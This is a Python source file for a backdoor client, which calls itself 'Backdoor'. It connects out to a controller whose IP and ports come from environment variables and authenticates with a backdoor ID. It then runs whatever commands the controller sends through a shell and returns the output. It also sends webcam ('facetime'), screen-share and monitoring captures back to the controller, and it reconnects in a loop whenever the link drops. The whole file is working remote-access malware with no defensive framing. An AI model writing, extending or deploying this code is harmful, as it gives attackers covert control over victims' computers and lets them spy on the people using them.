import os
import socket
import threading
import subprocess

from dotenv import load_dotenv

import modules
from models.command import Command, findById
from communication import ObjectCommunication, ByteCommunication

class Backdoor:
    def __init__(self, ip, port, port1) -> None:
        self.ip = ip
        self.port = port
        self.port1 = port1

        self.commands = []
        self.connected = False

    def connectToServer(self):
        print(f"{OK} Trying to connect to server with ip:{self.ip} port:{port}")
        self.mainSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.fastSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.mainSock.connect((self.ip, self.port))       
        self.mainSock.send(BACKDOORID)
        self.fastSock.connect((self.ip,self.port1))
        print(f"{OK} Succsessfully connected")

        self.mainComms = ObjectCommunication(self.mainSock)
        self.fastComms = ByteCommunication(self.fastSock)

        self.connected = True


def executeCommand(command):
    command.running = True

    try:
        if hasattr(modules, command.command):
            func = getattr(modules, command.command)
            command.result = func(command)

        else:
            command.progress = f"{OK} Executing command: {command.command}"
            out = subprocess.check_output([command.command]+command.args, shell=True).decode(errors="ignore")
            if out:
                command.result = out
            else:
                command.result = f"Executed command: {command.command}"

    except Exception as e:
        print(f"{ERROR} An error accurred when executing command: {command.command}. Error: {e}")
        command.result = f"{ERROR} Error when executing {command.command}: {e}"

    command.running = False
    command.done = True


def handleCommands(backdoor:Backdoor):
    while backdoor.connected:
        for command in backdoor.commands.copy():
            if not command.running and not command.done:
                thread = threading.Thread(target=executeCommand, args=(command,))
                thread.start()

            elif command.done:
                result = f"{command._id}<ID>".encode() + command.result.encode()
                backdoor.fastComms.send(result)

                backdoor.commands.remove(command)

            elif (command.command == "facetime" or command.command == "screenshare" or command.command == "monitor") and command.file is not None:
                result = f"{command._id}<ID>".encode() + command.file 
                backdoor.fastComms.send(result)
                command.file = None

def standby(backdoor:Backdoor):
    thread = threading.Thread(target=handleCommands, args=(backdoor,))
    thread.start()

    while True:
        print(f"{OK} Waiting for commands")
        command = backdoor.mainComms.receive()
        print(f"{OK} Command received: {command}")

        progress = True

        if command.command == "exit":
            backdoor.fastComms.send(b"0")
            continue

        elif command.command == "new":
            backdoor.commands.append(command.payload)

        elif command.command == "abort":
            c = findById(command.payload, backdoor.commands)
            if c:
                progress = f"{ERROR} Aborted excecution of command: {c.command}"
                c.shouldRun = False
                backdoor.commands.remove(c)

        elif command.command == "progress":
            c = findById(command.payload, backdoor.commands)
            if c:
                progress = c.progress
                c.progress = None
            else:
                progress = None

        print(progress)
        backdoor.mainComms.send(progress)

def main():
    backdoor = Backdoor(ip, port, port1)
    while True:
        try:
            backdoor.connectToServer()
            standby(backdoor)
        except Exception as e:
            backdoor.connected = False
            print(f"{ERROR} An error accured: {e}")
    
load_dotenv()

BACKDOORID = os.environ.get("BACKDOORID").encode()

ip = os.environ.get("IP")
port = int(os.environ.get("PORT1"))
port1 = int(os.environ.get("PORT2"))

OK = "[+]"
ERROR = "[-]"

if __name__ == "__main__":
    main()
